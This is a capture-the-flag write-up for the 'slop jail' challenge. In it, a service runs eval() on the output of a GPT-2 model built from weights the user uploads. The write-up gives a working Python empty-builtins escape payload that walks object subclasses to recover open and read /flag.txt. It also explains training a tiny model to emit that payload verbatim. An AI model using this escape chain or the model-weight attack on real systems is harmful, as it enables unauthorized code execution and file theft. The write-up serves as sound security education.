# Slopjail Writeup

## Challenge Info

- **Name**: `slop jail`
- **Category**: `Misc`
- **Author**: `sy1vi3`
- **Remote**: `nc slopjail.ctf.ritsec.club 1900`

## Files

- `jail.py`
- `Dockerfile`
- `docker-compose.yml`
- `model/*`
- `example.safetensors`

## Vulnerability Summary

The challenge gives us full control over the bytes that become `model.safetensors`.

In [`jail.py`](/home/jilani/Desktop/ritsecCTF-2026/misc/slopjail/jail.py), the service:

1. reads a hex string from the socket
2. decodes it into raw bytes
3. writes those bytes as `model.safetensors`
4. loads a GPT-2 style language model from that file
5. generates text from the prompt `<bos>`
6. runs `eval(generated_text, {"__builtins__": {}})`

The dangerous part is here:

```python
generated = output_ids[0, input_ids.shape[1]:]
slop = tokenizer.decode(generated, skip_special_tokens=True)
output = eval(slop, {"__builtins__": {}})
```

So the challenge is really:

- make a tiny GPT emit a valid Python expression
- use that expression to break out of the empty-builtins `eval`
- read `/flag.txt`

## Important Observations

### 1. We fully control the model

The service fixes the architecture via `config.json`, but the weights are entirely attacker-controlled:

```python
with open(f"{tmpdir}/model.safetensors", "wb") as f:
    f.write(data)
...
model = AutoModelForCausalLM.from_pretrained(
    tmpdir,
    dtype=torch.float32,
)
```

That means we do not need to exploit PyTorch or safetensors parsing bugs. We can simply submit a model whose greedy output is the exploit string we want.

### 2. The tokenizer can emit full printable ASCII

The tokenizer vocabulary is essentially printable ASCII plus the special tokens, so Python expressions are easy to represent.

### 3. `eval(..., {"__builtins__": {}})` is not a real sandbox

Even with builtins removed, Python object introspection still works. A classic route is:

- start from an object literal
- walk to `object.__subclasses__()`
- pick a class whose method has a `__globals__` dict containing `__builtins__`
- recover `open`
- read `/flag.txt`

In the exact challenge container runtime, `_sitebuiltins.Quitter` is at subclass index `167`, so this compact payload works:

```python
[].__class__.__base__.__subclasses__()[167].__init__.__globals__['__builtins__']['open']('/flag.txt').read()
```

That evaluates to the flag string directly.

## Exploit Strategy

The service always prompts the model with exactly one token:

```python
input_ids = tokenizer.encode('<bos>', return_tensors="pt")
```

So we only need to overfit the tiny GPT to one continuation:

```python
[].__class__.__base__.__subclasses__()[167].__init__.__globals__['__builtins__']['open']('/flag.txt').read()
```

I used the provided architecture and trained it from scratch on that single sequence until greedy decoding reproduced the payload exactly.

After that:

1. serialize the trained model as `model.safetensors`
2. hex-encode it
3. send it to the jail
4. let `eval(...)` read `/flag.txt`

## Local Validation

The local Docker setup uses a fake flag:

```text
RS{fake_flag_for_testing}
```

Sending the trained model to the local service returned:

```text
thought for 10s: RS{fake_flag_for_testing}
```

So the model and the escape chain were verified end-to-end before hitting the remote target.

## Remote Interaction

The remote host is fronted by an instancer. It first asks for a CTFd team token, then either spins up or reconnects to the team instance, and finally forwards the connection to `jail.py`.

Once connected to the actual jail, the exploit model returned the expected flag.

## Solver

The included [`solve.py`](/home/jilani/Desktop/ritsecCTF-2026/misc/slopjail/solve.py) does the full attack:

1. trains the tiny GPT to emit the sandbox-escape payload
2. connects to the instancer
3. submits the team token
4. reconnects to the running instance if needed
5. sends the trained model
6. extracts the flag from the transcript

Example:

```bash
python3 solve.py --team-token '<your_ctfd_team_token>'
```

If you already generated the model once and cached its hex to a file, you can skip retraining:

```bash
python3 solve.py --team-token '<your_ctfd_team_token>' --model-hex /tmp/trained_model.hex
```

## Notes

- `solve.py` expects `torch` and `transformers`, which are provided by the supplied Dockerfile environment.
- The hardcoded subclass index `167` is specific to the challenge container runtime. It was measured in the same image used to validate the exploit.
- `example.safetensors` is not the solution model; it does not successfully produce a usable payload.

## Final Flag

```text
RS{y0ur3_abs0lut3ly_r1gh7_h3r3s_th3_fl4g}
```
